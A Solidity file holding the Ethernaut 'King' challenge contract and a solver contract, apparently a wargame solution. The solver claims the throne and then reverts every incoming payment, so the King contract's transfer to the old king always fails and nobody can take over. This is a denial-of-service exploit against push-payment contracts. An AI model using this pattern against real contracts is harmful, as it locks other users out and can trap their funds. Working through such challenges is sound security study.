// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

contract King {

  address payable king;
  uint public prize;
  address payable public owner;

  constructor() payable {
    owner = payable(msg.sender);  
    king = payable(msg.sender);
    prize = msg.value;
  }

  receive() external payable {
    require(msg.value >= prize || msg.sender == owner);
    king.transfer(msg.value);
    king = payable(msg.sender);
    prize = msg.value;
  }

  function _king() public view returns (address payable) {
    return king;
  }
}

contract BecomeKing {
   constructor(){}

   function checkBalance(address _add) public view returns(uint){
     return _add.balance;
   }

  function becomeKing(address payable _to) public payable {
      require(msg.value > 0, "value should be > 0");
      (bool success,) = _to.call{value: msg.value}("");
      require(success, "Eth was not sent");
    }

    // This function fails "king.transfer" trx from Ethernaut
    receive() external payable {
        revert("haha you fail");
    }

}
